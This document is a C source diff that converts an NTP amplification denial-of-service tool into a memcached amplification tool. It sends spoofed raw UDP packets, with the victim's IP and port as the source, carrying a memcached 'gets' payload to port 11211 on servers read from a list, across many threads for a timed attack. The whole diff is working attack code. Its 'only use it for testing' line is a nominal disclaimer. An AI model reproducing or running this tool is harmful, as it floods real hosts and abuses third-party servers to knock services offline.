@@ -29,6 +29,7 @@ typedef unsigned char UCHAR;
 char ** NTP_SERVERS_ARR;
 int NTP_SERVER_COUNT;
 char TARGET_IP[200];
+int TARGET_PORT;
 int NUM_THREADS;
 double SEND_PACKAGE;
 int CURRENT_SERVER;
@@ -165,16 +166,6 @@ void* SendNTP(void* args)
   int sockfd,n;
   sockaddr_in servaddr,cliaddr;
 
-  UCHAR ntp_magic[8];
-  ntp_magic[0] = 0x17;
-  ntp_magic[1] = 0x00;
-  ntp_magic[2] = 0x03;
-  ntp_magic[3] = 0x2A;
-  ntp_magic[4] = 0x00;
-  ntp_magic[5] = 0x00;
-  ntp_magic[6] = 0x00;
-  ntp_magic[7] = 0x00;
-
   int ret = 0;
 
   sockfd = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
@@ -198,15 +189,15 @@ void* SendNTP(void* args)
    //准备servaddr,cliaddr结构
    bzero(&servaddr, sizeof(servaddr));
    servaddr.sin_family = AF_INET;
-   servaddr.sin_port = htons(123);
+   servaddr.sin_port = htons(11211);
 
    bzero(&cliaddr, sizeof(cliaddr));
    cliaddr.sin_family = AF_INET;
-   cliaddr.sin_port = htons(65511);
+   cliaddr.sin_port = htons(TARGET_PORT);
    cliaddr.sin_addr.s_addr = inet_addr(TARGET_IP);
 
   /*数据报的长度NTP*/
-  double pack_len = sizeof(struct ip) + sizeof(struct udphdr) + 8 * sizeof(UCHAR);
+  double pack_len = sizeof(struct ip) + sizeof(struct udphdr) + 17;
 
   char buffer[500];
   struct ip *ipp;
@@ -231,12 +222,12 @@ void* SendNTP(void* args)
   udp = (struct udphdr*)(buffer + sizeof(struct ip));
   udp->uh_sport = cliaddr.sin_port;
   udp->uh_dport = servaddr.sin_port;
-  udp->uh_ulen = htons(sizeof(struct udphdr) + 8 * sizeof(UCHAR)) ;
-  //udp->uh_sum = 0;
-  udp->uh_sum=check_sum((unsigned short *)udp,sizeof(struct udphdr));
+  udp->uh_ulen = htons(sizeof(struct udphdr) + 17) ;
+  udp->uh_sum = 0;
+  //udp->uh_sum=check_sum((unsigned short *)udp,sizeof(struct udphdr));
 
   //填充NTP头
-  memcpy(buffer + sizeof(struct ip) + sizeof(struct udphdr) , ntp_magic , 8 * sizeof(UCHAR));
+  memcpy(buffer + sizeof(struct ip) + sizeof(struct udphdr) , "\0\x01\0\0\0\x01\0\0gets a\r\n" , 17);
 
   ALIVE_THREADS++;
   //进入发包循环
@@ -267,7 +258,7 @@ void* Mon(void* args)
   double attack_time;
   double per_second;
   struct timeval start,end;
-  double ntp_buffer_size = sizeof(struct ip) + sizeof(struct udphdr) + 8 * sizeof(UCHAR);
+  double ntp_buffer_size = sizeof(struct ip) + sizeof(struct udphdr) + 17;
   ALIVE_THREADS++;
 
   while(true)
@@ -299,9 +290,10 @@ void* Mon(void* args)
 void ShowBanner()
 {
   printf("*-----------------------------------------------------*\n");
-  printf("                       NTP Doser                       \n");
-  printf("                 NTP Amplification DoS                 \n");
-  printf("   code By Drizzle (https://github.com/DrizzleRisk)    \n");
+  printf("                       Memcached Doser                       \n");
+  printf("                 Memcached Amplification DoS                 \n");
+  printf("  Original Code By Drizzle (https://github.com/DrizzleRisk)    \n");
+  printf("        Modified By Lv-Max (https://github.com/Lv-Max/)    \n");
   printf("*-----------------------------------------------------*\n");
 }
 
@@ -310,24 +302,26 @@ int main(int argc, char* argv[])
   ShowBanner();
   if(argc < 3)
   {
-    printf("USAGE: ./NTP Doser [target] [threads] [time] \n\n");
-    printf("[target]:     Target ipv4 address.\n");
-    printf("[threads]:    Number of threads.\n");
-    printf("[time]:       The duration of the attack (default 30 seconds).\n\n");
-    printf("Important:    This Program needs file \"ntp.list\" in current folder, which has some ntp server ip.\n");
+    printf("USAGE: ./MemcachedDoser [target] [port] [threads] [time] \n\n");
+    printf("[Target]:     Target ipv4 address.\n");
+    printf("[Port]:     Target port.\n");
+    printf("[Threads]:    Number of threads.\n");
+    printf("[Time]:       The duration of the attack (default 30 seconds).\n\n");
+    printf("Important:    This Program needs file \"mem.list\" in current folder, which has some Memcached server ip.\n");
     printf("FBI warning:  Dont be evil ! plz only use it for testing.\n");
     return 0;
   }
   if(argc >= 4)
   {
-    ATTACK_TIME = atoi(argv[3]);  //Attack time (seconds)
+    ATTACK_TIME = atoi(argv[4]);  //Attack time (seconds)
   }
   else
   {
     ATTACK_TIME = 30; //default 30s
   }
   strcpy(TARGET_IP,argv[1]);
-  NUM_THREADS = atoi(argv[2]);
+  TARGET_PORT = atoi(argv[2]);
+  NUM_THREADS = atoi(argv[3]);
   if(NUM_THREADS < 1)
   {
     NUM_THREADS = 1;
@@ -336,16 +330,17 @@ int main(int argc, char* argv[])
   SEND_PACKAGE = 0;
 
   printf("[*] Attack Target: %s\n",TARGET_IP);
-  printf("[*] Threads: %s\n",argv[2]);
+  printf("[*] Target Port: %d\n",TARGET_PORT);
+  printf("[*] Threads: %s\n",argv[3]);
   printf("[*] Attack Time: %ds\n",ATTACK_TIME);
 
-  if(GetNtpServers("ntp.list") == NULL)
+  if(GetNtpServers("mem.list") == NULL)
   {
-    printf("[?] Can't find file \"ntp.list\"\n");
+    printf("[?] Can't find file \"mem.list\"\n");
     return 0;
   }
   //读取 ntpservers list
-  NTP_SERVERS_ARR = GetNtpServersArr(GetNtpServers("ntp.list"),"\n");
+  NTP_SERVERS_ARR = GetNtpServersArr(GetNtpServers("mem.list"),"\n");
   NTP_SERVER_COUNT = atoi(NTP_SERVERS_ARR[0]) - 1;
 
   printf("[*] Load NTP Server: %d\n",NTP_SERVER_COUNT);
